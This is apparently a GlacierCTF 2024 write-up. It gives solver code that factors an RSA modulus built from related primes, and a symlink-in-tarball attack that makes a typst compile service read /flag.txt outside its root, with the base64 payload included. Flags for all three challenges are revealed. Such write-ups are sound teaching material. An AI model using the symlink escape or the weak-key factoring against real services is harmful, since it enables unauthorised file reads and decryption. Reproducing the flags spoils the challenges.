# GLACIERCTF

# CRYPTO

## Rivest–Shamir–Adleman-Germain

*Points*: 50

### Challenge

```
My friend Sophie recently told me about this cool encryption algorithm. However she is not sure if it is secure. Can you help her by breaking it?

Author: LosFuzzys
```

#### Files:

 - [rsag.tar.gz](./rsag.tar.gz) (1.87kB)
   - [challenge.py](./rsag.tar/challenge.py)
   - [output.txt](./rsag.tar/output.txt)
   - [requirements.txt](./rsag.tar/requirements.txt)
   - [sha256sum](./rsag.tar/sha256sum)


### Initial analysis

We can exploit that the primes of N are related to each other:

```py
p = getPrime(512),
q = (2*p) + 1
r = (2*q) + 1
s = (2*r) + 1

N = p * q * r * s
```


### Solution

We first, take a look at the equation: `N = 64*p**4 + 136*p**3 + 94*p**2 + 21*p`.

To solve for `p` for such large `N` we can use **sympy** in python. The 4th power is so dominating in the equation that we can approximate it by just simplifying and solve for `N = 64*p**4`, and then test numbers in close range (+-1000):

```py
from sympy import symbols, integer_nthroot

# Define variables
p = symbols('p', positive=True, real=True)
N = 48965492530 ...

# Estimate p using integer arithmetic
approx_p, is_exact = integer_nthroot(N // 64, 4)  # Compute the fourth root of N/64

# Search for integer roots around the approximation
for test_p in range(approx_p - 1000, approx_p + 1000):
    if N % test_p == 0:
        print(f"Found p: {test_p}")
        break
```

```
Found p: 9352496155192295944243473644483853835662636576410969996619180877861158926367873785037099054018741236476166923118647057249968914650337399039210616026612969
```

Now we can solve the RSA:

```py
from sympy.ntheory import isprime
from Crypto.Util.number import long_to_bytes

# Compute q, r, s
N  = 48965492530 ...
p  = 93524961551 ...
e  = 0x10001
CT = 58535947031 ...

q = 2 * p + 1
r = 2 * q + 1
s = 2 * r + 1

# Verify factors
assert N == p * q * r * s, "Factors do not multiply to N"

# Compute
phi = (p - 1) * (q - 1) * (r - 1) * (s - 1)
d = pow(e, -1, phi)
PT = pow(CT, d, N)

flag = long_to_bytes(PT)
print(f"Decrypted flag: {flag.decode()}")
```


<details>
<summary>Flag</summary>

`gctf{54dly_50ph13_63rm41n_pr1m35_wh3r3_n07_u53d_53curly}`
</details>




# MISC

## typstastic

*Points*: 421

### Challenge

```
I hate LaTeX, but I found this cool replacement!
I hope it's more secure.

Author: ecomaikgolf.com
```
nc challs.glacierctf.com 13371


#### Files:

 - [typstastic.tar.gz](./typstastic.tar.gz) (2.21kB)
   - [challenge](./typstastic.tar/challenge)
   - [deploy.sh](./typstastic.tar/deploy.sh)
   - [docker-compose.yml](./typstastic.tar/docker-compose.yml)
   - [Dockerfile](./typstastic.tar/Dockerfile)
   - [entrypoint.sh](./typstastic.tar/entrypoint.sh)
   - [flag.txt](./typstastic.tar/flag.txt)
   - [sha256sum](./typstastic.tar/sha256sum)
   - [challenge](./typstastic.tar/typstastic/challenge)
   - [deploy.sh](./typstastic.tar/typstastic/deploy.sh)
   - [Dockerfile](./typstastic.tar/typstastic/Dockerfile)
   - [entrypoint.sh](./typstastic.tar/typstastic/entrypoint.sh)
   - [flag.txt](./typstastic.tar/typstastic/flag.txt)
   - [sha256sum](./typstastic.tar/typstastic/sha256sum)


### Initial analysis

The main script in the handout is `challenge`. The script lets you upload files through a .tar.gz folder before any `main.typ` files gets compiled with typst. Here is the importaint parts of the script:

```bash
read -d @ FILE

DIR=$(mktemp -d)
cd ${DIR} &> /dev/null

echo "${FILE}" | base64 -d 2>/dev/null | tar xz &> /dev/null

typst compile --root ${DIR} main.typ

tar cz main.pdf 2> /dev/null | base64
```

It also provides an example of how to upload a text:

```bash
tar cz main.typ | base64 ; echo "@"
```


### Solution

First we tested the compiler by creating a `main.typ` to read the flag using `#read()` function in typst:

**main.typ:**

```
#read("/flag.txt")
```

This threw `[!] Compilation failed :(` with no error messages.

To get a better griup of why I decided to set up my own testing space using the Dockerfile supplied. I can now remove the `&> /dev/null` from the script, making it easier to debug the error messages.

Running it in my local space, I could see that the reason why it didnt compile was because it tried to access a file outside the compilers "root folder" as defined by these lines:

```bash
DIR=$(mktemp -d)
cd ${DIR} &> /dev/null
typst compile --root ${DIR} main.typ
```

To get around this we can use a symlink. We can upload the symlink together with the `main.typ` in the .tar.gz and link to the symlink rather than `/flag.txt` directly:

**main.typ:**

```
#read("link")
```

```bash
ln -s /flag.txt link
tar cz main.typ link | base64
```

The encoded .tar.gz with `main.typ` and `link`:

```
H4sIAAAAAAAAA+3TSwrCMBSF4Syl1IlO6k3amvUEfFCMRdpIdfemiOLIjqIU/2+QO0ggBy7n5Jq2
CLezSkgia+04ta3lfT7oWunKGjFGizVK4llWKpOUoZ4ufXBdlqmh9x/fTd3P1KLbue0y9017zFe/
DoOvGxef+o/J/ou8+q+rMvZfb+rYf7Pee3cowjUkDPfn/QcAAAAAAAAAAAAAAMC83QFlYOy8ACgA
AA==
```

Now the typst file compiles and echoes the encoded PDF with the flag, that can be decoded using the given command:

```bash
... | base64 -d | tar xz > main.pdf
```

or by using [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()Untar()&input=SDRzSUFBQUFBQUFBQSsxYWQxUlRXN05YTGtVcG9pZ2cvUmlsQ0VKNm9VVjZyNkZLRDVERVVKSVlFcHFpb2xRVkVCUVJVS1FLZ3RoQg0KVUJGUXVLQ0NxQ0JGRVZGQUVhU0pCVkRrblFUcjFmdDk5LzN4MWx0dnZXOW4xanI3L0dabW45bDdacGN6SjhGRUtrMkQ0VTllOGo5WQ0KWUdEQm9GQ2NLd0tGaGY5NEJRc2NpNEdobHNCUldBUU1nWUJqc0xBbE1EZ01nVUV0QVdEL2swWjlMZXdRRnBFSkFFdmdTQ1QyWDhuOQ0KTy83LzBhSm9aMlNpRHRmQUNpcnVCb3VnSUFxQUFYVGZBRUVkSFVFQWdEcEdNRWdBMUlST1kzSHVITmkrTEM3QWdXRWN4SUFZUXVKdw0KQWFpTmhZR3pxWnVhRmRXWHhHUlJhZXdRQnhLVFNsWW5rQ2pzSUNKVDNkeWZSR05SV1JIcVpodzFZNW9mM1o5S293RFFuM0VqVW9nZg0KaWVaUHBMRTRqWVlBN21qUUdvSW4xeEs2RTQwS2FwRUFMQWNUeE9NRlFVbU9wWUxvZjJLeW9ia1JCL3R2Vzg2UkJYVWRJa0pZcEdCeg0KR3BrT2NCOERvcUFBTllURmpBQlU5RUU3U0JzWFVWdW1QNmdPZGszbGE5ZStNQnpZREVZUUtSakVBSTRCb1AzQW9wbWNUak9wREJhZA0KQ1dDNFhlTU1oQXRYQ09vQ3VNTUFPSUNHd1FBRStFTWhjQUNTODROakFCVDRROEpoQUJyOEliQllVRmNUUUdIUUFBaUJoTUpoQURpYw0KUTJoTkxBQkhjQWlOeEFGd0pJZTRjaWdPb1hCZ2pVdG9KQ2lPNFJBR0E5YXdIRUppUVVVY2g3Z2FtaHhDYW9LMmNBbU5BbTJDY3dpTA0Kd2dJSUJKY3dLQUNCNUJBYWh0YlFCQXZJUVhFSXhaRkJjd2lEQWRVeEhPSzBpc0F1RXRielI1OWlmL0twRllsR1lXMEZ4V0hmUFd4bw0KVFdSd2g4aWFFeFJjaGdrMWlFVmlndGNnSW90a1JPSkVDNmROMEVra1lyQmcrTEhnUTliMDU3Q1ZjUk9mQkNlV0pzcDNkK3VsVlpZZQ0KdEZpeU1YNW5pZVBWbHo2aVFSdDhUVzJZL1UvUGpuWGxsVG1wNjc5cDZkSmViM3R5YzUvb05JV1VqUEwrUFBoNnJ4YlMxWHo2ZVZHQQ0KY3Z1cnp1YThkVTlxeFRZU0NpNXY5eTlIWHlqSUVSK3E3R0JQR0ZpcVEvZm13MTljUFNoeVBIQmV2Qi90Q21mVlVJOU5YeHlIM3NYdA0Kalk3TmNUMTFMUHlKdDFSdHlMcmE1dENLK3lsV3VHNnEwOUUvc1YzV2FTWDFhV0hLa1l6OFlqYzFtZlR1KzZNMkRYdE91YjFQdlZFYg0KMUhzWVA4c1lpd3l3aUVJRUphcWdMOEhUcWcvdHFPbzZjOWtGSTVUMEJHNnNITjUzR3VJK2lzeE9hdjA4b0NNY3ZIM2QwdzBEOVJadQ0Kc1pUbjhidktwWDNOWldmSVNRNklLZExjdGNvMVFodHF2UTlJNitjYXY5cms2VzUrSVIzZlBwaDQ5U0xaZG50WXA5ZlU1Z1dJNmFPcA0KRFF1T21Kak5WWXk3R1R2R3pEZnBRVmJXQ3FqcnVkOFRPeHp0bkN2TFNsRnR5eFdZQ1kxMmx0cTZXc1U0cHo5M1RZd1h3ZkZaU2RxNA0KL3ZDbXZWZDJlMG1VNWJZSk84MElybm5IcXlJZ250dXRURzRXdEd0NUhIMHd3eS8wUEc5anovckduZys1T0VQQmZaR3BtRW5pK3gweQ0KWjVUNm9tczMxTzYvWEg1d2J3VXQ4SVpxblBqa0I4L0FLMk9zUUxjVDRqdWYrYTJ0VmJPbGY2eU5rbG81elltVEwyNzlHakc0MzBVTQ0KRW8zRC9GMWsvTjNxWVBoVHpNUzZSSGlzQ1R0UzNJaDNmREJ1ZHlyQjZhU0ZwelVxYzYzaXJZUUI0VldpSFZ0MTloanhwVi9VSExxdQ0Kdi9WSzl2WFNzZ21hOU9HUGwvSTBYNXRvOGpybTI2OVBEUGRsb1A4OGVxQWd1MkViWmpaOUdwbGRqdGs5VGdtamZFenhEbk41dVAyZA0KVjgzRWxGcHlVOGNwZWRrVlRaU1FIWVVxdWtpOHB0cDZzOFB5Q3RPZHB2bmRwK2RYdlJvUGlSYSsyM0kvZkZWTG1aZDhBMHVVVURBYg0KL081NTI2emx1a3N0VS9VTFV6RWZTK1BqbStxc1FvZXNGdVN1ZnA0cjY5cnhJYS9KUzZqWFcvU2FSR1E0RTZmejdPVHU0Y05tOS8vYw0KYXM4azd5RDNaUjN1dVBaMnBydXFwYnB0MTZ5RzU0dVBSeVlJVDhOZWppZXNibzN5NnV3TmZyVnhlWDVKUy9YU0xabmJOcjZTc3RUUg0KT1JuTzBJR2RUMXF1VW5ZcE9xTjhqQlNxSm1waE9kdkFhbnZnWFhPU2VvM01zbExJaHBQZlJDWktHZW4yN085cGt3MHpoYlpMaTR6Ug0KNmp3ZlF6NGdCc2ZnVGNmSERlL3lKNVAyK2V6YmVSdWFFK3RBc2Ftd21kZitJRTVUZzZZMFRicnpLZ2pSck85a2hrWkZQajlBUW41dQ0KRCt5eXhFUEZoWkp1bktDWThBZnlINjFkd2V4bTErOHVKcXNXUkY0WU9yVXZiRHBEVTJWU1FLbGYxTHEzV0llOGhMMndaM3dYb0hBMA0KNS9nQUhqMzVUSjdCRS91NXJwbnZROFFOSDVVeDNzZHRZMjM4L2tKbU5mSzkrYmVtYUhLSjE4UVpZakc5cDJVTmFCMnd4MGUzYkhVaQ0Ka2RqVzQza2RsKzU5bWtHSlZidjVTU2c3MG05R3VRUkZhVmZ0M0JXaW1zaUtMZlpmRTlQa2QvN2h4aVJqWG1Zd2xlRjd1NC94K29uNw0KS2V5U0ZWNHkvUExsQXRKcG80bWR3MnlXY0xMSGlqWkxsektFMmNqdUdFTC9yVzFEVGFWSjZFckJDK2V1VnpjazdwcW1Hejc5SUk1Ug0KZkd4ZWR1cktOV0ZzcGlOaC9TMko5ZTBaNWhiYk1OcXlPN1ZFbmRMbENSa1ZxTkhiVTlFRmp2WEVCNWtrTmF1Ym5TMnIxZmQ3N3B6eA0KemE1OHh0Q3U3eFNzM0ZNd25LWmJEYjlUbEFIMUNCaGVPM2M2K0t6Q3VwaSt0SjEvdHRlLyt2VG9VT2FDWE9tbDVyY0V0NVVTQ2puaQ0KeVdmN21DSldmemdrNy9vOFcveWlDcWViV2FxVzBkbVBiaVdwR3lwVTkzbWcyaVR2eGcrTGUvZEh2ZmQvV0w2VXNLd29iZDFremVwTg0KNXhqalNSSHlmanozRElwY1RTU214RkZGeXZqWTR2QkFkMExrZG9HQXE4ZGpIcWxpTGJicTI3aWxiUkt4VFgvY2RxaHVKdXg2aFFkOQ0KWGRsc1pMcXp2aDVVbWU0NjhXQ2xTYnBOM21GVmNVSytxNGI5bWxPOHZrVkdUcERPekZ4bHBaalMwaUJ5OHVxRXh6alJKcDE2YWNCSQ0KdnpYcStsQ2prWHh4aEk4NXZlYm1Uak5aRjV2QlRFdWh3TWw5YzFrais1N2ZmbTNvVDNMTHNvbUJlbCtRMWxBc0NKMmFYdE5tS1IrTg0KMXFubElaMUxPM2dIM1dOU25YdWNWdXg1WnNEeGFoZFBnYjNEZXF6ZzU5TVpvL1NMcEc2aVI4M2wyWURwaCt5TWc2dFdOcjh0Mk5jVQ0KSlc1cTBYTW42RFhwRHNaRS8wd082a1pyN3hPcCtxV0tNWTRXR1VkSlhZVkp4QkYxbnNGazJibVExRlV6KzU0ZmlqR2RDYmR5N2Foeg0KaVh3Z0xERktONzdTaVczcm5LNHQwWXAwamJBRjNqcHAxMTNEODdjOTJ6MW5iMHRHbStuUDY0blM5UVk2c3BaWEhNbHVWck52RnJkZw0KWHR5OHBrNmNmbk9YdU93OUtZY3gzTEpkMlpkZENwZTdXTDl0dDdnNjdQVnlWU243d29tVlVaVlhSRC9lV1ZiN3lTZTl0UlFsY1doUw0KN2w3c0RZMjFEUXJYMkZKV2NyTnEyM2VaYTdkM2pULzVhTnhBT2pmMUlLZXNPZXFGazVKb2pSaUxDWS91ZGEzYXRuK1huY09nNXFvZQ0KMXpyamNVVUZIN2FTNVVxcDdGcW90SHU0NG93eWJQVEd6ZnZJVjNzVkxvc0ZwbXhML1JqRkxsRFc4R25XclhwRHhWMmhSOTI1L1A2Qw0KcGZjSnBZK0VxcGZHSXRzTnpuZTVERTM0dFdkbDRsbFYrQjMweWFhUGhKRG1lYWZlVmsvRlpJblRsOTgxYnpFWUxwTWlXNDMxS2RNRQ0KUEx6WmtxYy84MHZobXhyeWVwd2kwT0x2Yjd0ZGZGU0NPYi9CTG50UUF0bDVyM3RiaFI5c3Z0VTZVL3R5c0NLUDgwVzB4czRhZ0NWeg0KVXFxalVzeEg1R3lGUy9tNk96WnVaOXREcS9QTTFPeUZPbCs4TEc1NkRqc1l0bU13djE1UFp5NXMvRldlMzVPQ3RaUGh4UjlUZUJIQw0KdW4rNEJDazJuUkJxaXBCTUdJL2M0N0U4OGcrcmoySUp1NXFyVm9mR0JkbnVQeWN3c0w5dlR6dXgyYU5wMUZDNytmQ0xTZ1BsTXhSYQ0Kbm5qOFlDUG1nbUw1cTZnRUlyME1JemtPY2ZhUE5adWVWQlNiL095cGQzeDBiRjNzNkxNMFduS08rUWQvd3JNMWI2bkN0a3J0aFVkSg0KUEVweEZFeGdGb2tjUFhuMFViM0h0cXlRYS9wRGNoSnhLVnN3c0w1UFFwM3I1WXpVSnlLOXMzYnhiWEd6dWRpaHAyVVpLYjdYTVdXMw0KYytCR0hpbjdSa1BieGhPVEg4TE5pamNmbzkxTE5LdHdzMDY5SFpWMnZER1BwK2loU1EvRGY1RE1wZys4RE45OHRsMzFrUUhlZUhibg0KN0w3MFE2NGp4UUxVcmxUOUFCOHhTelgyTFA4UkdiNU5ocFFUU3o2K0ZuZDJkcW1WK2dQdTF5enBvOGpJUjB0azl4aXc1S1ZPczU4Lw0KUkJ0blloNWtGVmhiMytpZm1GWGJjUHU0b0VIOVNVd3pYeXRMeGxKYllHalN6Y2ZIUWUzQUhzRHcvR2NKZm9ucCtNUHptYUg1bUYyMQ0KNml0RWU5d3U3UlF5dDVmZUIzRzBpTzJOdXcvczMrK3g2eVJFcWNqR0FuaGFaT2tzYm5LcUF4RzgxUDJDVGZIOVowOUtDYTBuemhYTA0Kek83MEhYcHZmbEo3MktaU1J1Q2hUaytyUmsxSDY5dHRyejk0OGtWN2o4L3hSL0NLWmFvTncxMGVuWHp5ZUY1U1BDM082RXhsUHNFaA0KYnYwSFcyKzEzUjY0eDFnMExlUFNHWUxWRWN0OVFacmhvYUUwL1E2WFU1VDZBeWRvU3hUcXRqenJKU3R1VkplTVlOM1owc1VXdTVqUg0KUVVHdHJOaXlUVng3MjB4a1EvYnkyTTVqYzZFMUJTTTNFc3BUMS9BN2svWkNVenhhVHJVdDFmYVlrNTFZcU5wN0lIb0ZiRi9mZmRKNA0KZTZwSlJOS2ZXOWNBb2lYOEl3eVpUaFBzZ3lSZWhCS1dIRGpJckYrUlhqb3NPaU4yTGpyc05ubE1LVEo4TTlxSXJ6T3RrbEIrMXdyUw0KSmU0cElGL2F5cU51WE5hOTF1bjZIb3Vtdk15TW1WWFdwcWtEYlVOcHBRYlA0blU5aDNQbXRSNkdlTXJtYm8rYzg3N1h5RzRqaTc1Lw0KRTV1WmRqMU5pVHgzOGRhRXRHR2tYaG92KzczVDFUbnp2WDM1UlphOFYxZ2gxL2lSWmNLWDdOWDBtSUZxajBWemtPZXBLeTVRTVZLRg0KVHZOcnUrc3ZqNTROV0NZM3lodXpSMHRQenV4QTBVQ05oQlZnNjZUVWw3Qk9GM2IwUk5rUjhYMkpEV3Z0OWJWeUxsMzlKTDhjUDFPYw0KMTVRKzFLamd3eERZZk8vNk13R0RtWXVGKzZ0ZjlmZlcvTEZ6L0FOdjJkR0F0Ky8xYjRySXdmczY1RlZqOWlVbkZ4WW9EN1RodDh0Tw0KcmxXSSsrUEVjRzEwd3M3ZHUvVjRCdC9RbllmYnNwUjRqQjAzcEdmS0dVd2NGNzdtUmNpYlc4Ky9FWDhzY29udlpGdGVhbnI4b1lTRA0KK0hmRHNGRWxoWE1PTzJmbTQxK3lOZnMySjEvZkhIYzR1cUpmb2VTUk1WcjFORStEcjEwWkc2RlRoTE9XVm5HNlU4SG5WdDEvT04veA0Kdk54ZTdTY3FueWY1YXBrWEdsNUZiZFBnUDU5OFhPaVdxYlIwTUx2UzRya2Q5ZmpOT1BkTkk3NFNQTVdLU3U3MmZGN2VYZmYwSVBGbA0KYjFhWXZrNFUzbjkzdzBGRXhQa2JRWFc5ZDI5NitBVXJ2NDlUSG1adUgwdjVkUEd0WnJBVTBTN3djRVB5VEVyNzA4UU9pVkZGaWVyYw0KMHN1ZHJyRXV3NGpuNXJnL1AxaEdMZFdZWndsRWpZVFBDeEdtWkR4aTd0ayt0Nk1nNlRqWHZMV2xiYlhDTDVJZ3k1dVdSbzhZc3JaRA0KWU9VUExXUVloWTMrSFNYVy91WU9oeTZzWGhqYzFpNHFhZWd4MnJNbnU3TFRXRTcyeGhXdGtVY0JiYzJmN1V6V0RqMjhsQzFTZEdWRg0Kc1BMWVNzQTZiajV2U0h0cXQwaGV0clAyKzZkbUcraE5McVI0djNWNVBYRGVCMkxIblp4VjExMGMyWGQxU0lSbmd6NnRwY2oxd2JMRw0KdHJmNzVSb05ROWNBTzRTckJURVgyL1d1RENveUsvZ0tzanBzUGpqS0xnU3BuajRXN0dSMWlVN3g3QnE2NFBEKzVTUGZnMVZETFNrcA0Kd3JaYmZkc1dDaEpEczlCMGwzanRXd3NkRFFPWjZnTlpDUjRpeTFYZGFwUFc3UEd4eEZ4c3FJZEhLNmJVRzZ3VVBibDlENHlNMS9MUw0KRnhNM2JkeEhlSFZwZWN6N2pSYUthTzM2VGJnUmg2Mm9PK1ZWalVFNi9oQ0ZwU1B3d3VwRDhTdWt6V0ZDSGxvZFR2ZDFTckoxY3piRg0KMzg1UFM0TU1GeWI2ZDZXbkRkNm9Hb0k5TWswNzA5RWMwUGZIUm54MWxOdW8rZnpnV0VGSjRkdVlsNnVpTE55WlEzaS82RGF0cWpNcQ0KK3RiaUZYZTlsa05DVXRyamswZkpRcy9PbDc1V2pxWnBSOERpV0hpZjZHR1gwOTF2OXNpZWZ6Nm05Zno5L3FsUDdxekdUZGVQTHNNag0KM3ZTS2ZNNldQR1l2N1ZRR0k1YTRsOWVsakswT0hmb2tYWmk4cnJWL2ZJbldPaGVwRjFVdm1la3p0YzNpRjdNWDlneFZmWWJlaVlaTw0KVzNhTWlCbEliVW5kVFJlK0kyYWMrdXdaOVRFUEREZjlDZEd2RDdUZXRibHNkY1RMVU5sZlBUVzlvai9YdG43aXpPR3JLem9QUnFtYg0Kc2grR214cmFrOUZidkhMVmVsS1d2N1NZMHorOHVzVW43SzEzdEYyb3c4THRLTWMxaHp6T3lhVWtsVWoxMnI3QU5kUlFZSFpGTHg1Wg0KL2ZuZ2JOcjEyTUdyQjBjRmRpazR5cjllbVdvZkhDWGxNbm5mWVV6Wm8vQzJLamFCdWxSbldXWEJibmYyTFVLS3dxdGJYbmZIRy9hYg0KUDdNOXZiS1hGVDVhSnpPWnBEd01SZFpwM2VQcHZESFViKzBmUTEyUUVYektBL2N3eit3TmFOeDBxZEYzZlYyWmo1ems3T21hNHFMVA0KTDJjNy9FcGFXcFpwQmZpT1BDbFZqVERoT2JhOGE2WjVrRmtrNXJMeG5STGY4dUlsdGY0WkY5NGVNbzlwUEpkcWYzOGdQSytudWFCVQ0KMWJnTEExT0ltejNhYUpMSmUwaXRpQ20xVkxKK1plZ3V5VnFzL1RWYlRmTmFteXRueGxXR3N2Uk1qMnAwMlQzOU0yc3FIazh1dUY5eQ0KODExaytvSEdkN1YxRmEzMmM4K0JoNitubW0yd1o0NGxQMDJ3ckI3Vk00R3daanNUa0s5enV0TkVTa0lucWRxVWZreEN6ZGh5R285UQ0KMWhWV2V5RGpQUzNhRllwV1N6QjlQMjI2V1VyaVdPMkROMC9XOHQ4QW5nNkpVdmdNQjJzK1JNN1hIek1wcnU2MWNkVzZkenFHVjFYQg0KKzlnN3hoSXJUYTE3Q3oydndtZDJIdEZ5eW1tNVR1dzVNZE8xZlZjWVZlNWpmdlFCbmU1a2FZblh0eVRGTHc0bDlyeTVQdC9MVjJWQg0KV0lFSkVSaXg5VVN1a2hBaXBXVzZ1Qk91VnJ6a05TdGVWZVdOcUZPTEE1b0N3V05jV05mNGtDQ0JYMUxOaFdYc2FaVlpQa2h2VGpMcg0KL0NnWXM4QUhxWnRpL2VaTkUvTTMrYWJ2aVp5dnFSMGJZakRwbnlTWXdOZFNTZ2dBUjhKaFdOeFhYUU1EZWpqZ3JvNUJZTkdBT2dLTg0KQVRCd0xDZWhnMEJ6ODJIbUxHSVExVStmUmduNmt2elE1NlRPV0FCT0UvVTlrOFlDTlZIY0YyQkRJc09NUktWc1pRRVlOUGNSRGl4Uw0Kc0RPZ2lkWkFmWDBnK0k1TVFnSzR2MmJYRUwvcHJSMlJ3bjEvdGlNeU9RL1IvSnEyc2liNVU0bGN1MkVnaEFaYkI2M0hBRGdVWEFPSA0KMDhSeERUY0VIMFhpSlBmZ3NLOXFCRklJbmMzMEk0VUF5SytRUG8xRzV5UUFmMG9LY1RWK2VjZUg0M0QvS1BsejhMellEVUE0TGl3SA0KVWlBWHROcGdxY3NFaTBGMkVDaDNLUTdOMWJoZUkyczljYnRub05sVUxHMnpKSThWeGZaV3VHSEZCd0hSSjdsWkdjRlBwNlppYVlSbA0KRHRqU0Z3ZjBlUE5jbW5LM25tSzZiZys4dFhzYW5XZWVBaXNaSFk5TGVKVm1KN1JsYTB6NVBVSFBGOGpIdHBWK2ZFZjA1dTU3UEtYSQ0Kdkx6bVgvaEhOY0c4NE9EbndFdFdSZFVKV2VsYUk2SHA3cjc1UlU4NlkyNE5OUHJaVTFUWG5MdVgxQmp6SnY1ZHdPcnozU3NRTG1ITA0KSk5tQ213K2RESEQrVFFocS9vMVRRaFpIbUEwNkJjNnBXbEw5d1VGRUxHWlJmeHhKK0xjR2ZrUVJ2MFdSdjBPUlAxbmdhdXNiUVBKag0KQWR4MkNZdWh3UUxkUVFPNGJYSVI0M0NXcVFNTGRBNEEvK1ptUTNvUW5lbkFJUHFST01uSUx5QTNMZnMxeTJvQ0E3NHl3S2YvYU5iUA0KbVdwL0RKckNKRVlBN2xCelEwTk9jdGNmZ1AvYTdkL0ZEd0xEblNFMml5TkdJTklvSkc3VzFmT2ZSRlZVaXI0bGovMmEyRFpVdW9Ueg0KZmc5cDRWWGxndms3OVdJT0JqOHEwWGNvNjVJSkxzd2tSdElOUmx5TUZuSWxLb01sQjA4ZUdlT3RUNmMxbE12d1lTRnQyaU1tK2hNRA0Kak91TjFTa2hTMXREcTlReVJPcmU4YVJhbk1qc2VwRzBpbXBnS2h2WTNiQmk0RUZ0eXpHSy92b3Q5bS8wY0VlenZFVGNoaDhhWmtjNA0Kejc3VWNOT0lDcDZ2WFhOOXduSnM4NlljY1RWbHpWa29OZVVqQktDbmh1NlB0ajF0bkRqUVM1Yll0bWVtZjEyMmpaajNTcGt6MHczSw0KQ3pFaXZwb1Rxb2J5NHh1QTFEMTEwOGRhUmxRT0ZZYnh4bURiK2lEVHlrMEQ1ZDBiSHdhcFBId2lBRGxiMTI5OTZ2TlZ3bDVSdmJNTw0KNzB4UExNZmNIaWtzMnJGMGVBZVBqTkk1ejZXZDlQaHVlZlBYdjRsUitNOTVlVU9ReWNseHE0RFJHc0lDWUJwd2hBWnM0emNPbFU0eg0KNHNTR2lwRVdBb1pBZ2VzY0VnWkRZdUVJTjY2TU5kMy9iOWsvT2hqek93OXJMaVlCRjZlSk5ZbEY5Q2V5aUQvbC8xeXRyWDV3cTg3bQ0KY0RBa0Ewa3N3SmRFb2RKMElSTlhheUVBMVY4WDRvSzJobGt6REVsYnFXYVJUSkpEcEkyalgyU2duNlkvWkROZUoxd3JQSmdSRExZTw0KaEFjSDBVSzB3blVoUk02SEFTMnd6b0doRUlBcndnclVoWUFYOVRBbUZRd3RDRjZINlUvV0loaVpmRkVENzNRaFcxa3NoaFlVR2hZVw0KcGhHRzFLQXpLVkM0cHFZbUZJYUFJaERxb0lSNlNBU05SUXhYcDRXcy85TEExODBISEVlQWMwLzBwYk5adWhESWwxYjkvYjQxeW1Beg0KZzdoTit2dEJTWXRmSkVLZ2NBMDRhTjlYeTRNWjM2UnBJUnJjWG1qNDBZT2g0VVFHS0FuN1NkTGErbC9MQmdmL0pPNW9SL25YOGl3bw0KZy9KZGcvSERhUHdrRGpKQWNTUW9DWTU4TUVQclMzZzUwdWxCK0I4alRBZjZWNjRPMTJndEk3b2ZtOU4zY3lNOFFTMlVhVVB4aTFDeg0KTlZjelpRZVFzVlNNQ3lWTVY1ZXIrN1BvRjJWeldnaUxTUE1qL1FQbEgwUjEvUDIweUhSbU1KR0ZKeklZNFBiTkRYdE9WM1NnMzFrNg0KNEwyV25aR0pNNGtaQXJMeGNBMnNEdlF2R0tlbElIQ2xZb05yL3FML0RZaVV4VW9RRlUraTZVQy9WQmNyWENiMEo1MUZWMmpaY0hjTg0KUEp4cjdRL0FsMzRTd0lsRjVSaHBHRVFNQ2NFem1IUTYrV3ZIL3NMNzdnVVNaNmJpT2ROVUhRNVhSeUFkWVRBdEpGWUxuS3MvT0dOUg0KaUtzRXptMHFPZUxmS1AwZ3ROaW5Id0wrQ3dMT0liRDJiUnJpdjA5ajBGSmRDQk9jcEw5YnByQy8yVXNOd1FVaWlFNVozTWpBOGZoKw0KeEhHbWtzSklURHNtaVV3Q3p6NmNNOHZYbmNxSXlnUzNRTTc4ZzFvaENOOCs4WDFkYndENHQ2OTdWa1RPOTBFUzdhZWxLeHhzVWhEYw0KZG5DQ3NHOEZQS3loa1dpQUxQSUZRK013b0NGY0R1MGJCa2NqZjhFd09OeGZNUmlNWThCZk1MZ20rcThZU2hQK0N3YkRZSDU1Qmh5Qg0KK0VVT2pVYi84bHcwUWhQeHEzMkkzMkFvMUs4WTVoZWIwVGlPeDM3R01BamtMN29ZSkJyMlZ3eUwrdEZtRnBNSUhubVpYeHp2UUkwaw0KY1VhZmN3YWcwMWtBSFB2VlhkeXZ2dHpkYlBIV0NIQlgrYnRadnhINGU1Ym40aFpEWkxLNHZnWlB4bkJCUlVWalc1UC83ZjhBL0tmOA0KcC95bi9QOHMvd1ZIbjhMaEFDWUFBQT09&ieol=CRLF)

<details>
<summary>Flag</summary>

`gctf{4820_Th3_FutUr3_1s_n0w_0ld_TeX_Us3r_9238}`
</details>




# WELCOME

## Welcome

*Points*: 50

### Challenge

```
Welcome to GlacierCTF 2024!
Join our discord (https://discord.gg/DFYnRAME23) and read the rules.
Your first flag is <code>gctf{w3lc0m3_70_6l4c13rc7f_2024}</code>
```

### Solution

It litteratily gives you the flag in the description so I wont go into details on how I got this flag...

<details>
<summary>Flag</summary>

`gctf{w3lc0m3_70_6l4c13rc7f_2024}`
</details>



